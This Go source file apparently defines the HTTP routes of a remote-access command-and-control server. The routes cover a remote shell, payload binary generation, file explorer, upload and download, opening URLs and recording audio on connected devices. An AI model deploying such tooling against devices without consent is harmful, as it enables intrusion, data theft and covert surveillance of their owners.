package http

import (
	"github.com/gin-gonic/gin"
	"github.com/justadoll/CHAOS/internal/environment"
	"github.com/justadoll/CHAOS/internal/middleware"
	"github.com/justadoll/CHAOS/services/audio"
	"github.com/justadoll/CHAOS/services/auth"
	"github.com/justadoll/CHAOS/services/client"
	"github.com/justadoll/CHAOS/services/device"
	"github.com/justadoll/CHAOS/services/payload"
	"github.com/justadoll/CHAOS/services/url"
	"github.com/justadoll/CHAOS/services/user"
	"github.com/sirupsen/logrus"
)

type httpController struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	AuthMiddleware *middleware.JWT
	ClientService  client.Service
	AuthService    auth.Service
	UserService    user.Service
	DeviceService  device.Service
	PayloadService payload.Service
	UrlService     url.Service
	AudioService   audio.Service
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService client.Service,
	systemService auth.Service,
	payloadService payload.Service,
	userService user.Service,
	deviceService device.Service,
	urlService url.Service,
	AudioService audio.Service,
) {
	handler := &httpController{
		Configuration:  configuration,
		AuthMiddleware: authMiddleware,
		Logger:         log,
		ClientService:  clientService,
		PayloadService: payloadService,
		AuthService:    systemService,
		UserService:    userService,
		DeviceService:  deviceService,
		UrlService:     urlService,
		AudioService:   AudioService,
	}

	router.NoRoute(handler.noRouteHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)

	adminGroup := router.Group("")
	adminGroup.Use(authMiddleware.MiddlewareFunc())
	adminGroup.Use(authMiddleware.AuthAdmin) //require admin role token

	authGroup := router.Group("")
	authGroup.Use(authMiddleware.MiddlewareFunc())
	{
		adminGroup.GET("/", handler.getDevicesHandler)

		router.GET("/logout", authMiddleware.LogoutHandler)

		adminGroup.GET("/settings", handler.getSettingsHandler)
		adminGroup.GET("/settings/refresh-token", handler.refreshTokenHandler)

		adminGroup.GET("/profile", handler.getUserProfileHandler)
		adminGroup.POST("/user", handler.createUserHandler)
		adminGroup.PUT("/user/password", handler.updateUserPasswordHandler)

		authGroup.POST("/device", handler.setDeviceHandler)
		adminGroup.GET("/devices", handler.getDevicesHandler)

		adminGroup.POST("/command", handler.sendCommandHandler)
		authGroup.GET("/command", handler.getCommandHandler)
		authGroup.PUT("/command", handler.respondCommandHandler)

		adminGroup.GET("/shell", handler.shellHandler)

		adminGroup.GET("/generate", handler.generateBinaryGetHandler)
		adminGroup.POST("/generate", handler.generateBinaryPostHandler)

		adminGroup.GET("/explorer", handler.fileExplorerHandler)

		authGroup.GET("/download/:filename", handler.downloadFileHandler)
		authGroup.POST("/upload", handler.uploadFileHandler)

		adminGroup.POST("/open-url", handler.openUrlHandler)
		adminGroup.POST("/record-audio", handler.recordAudioHandler)
	}
}
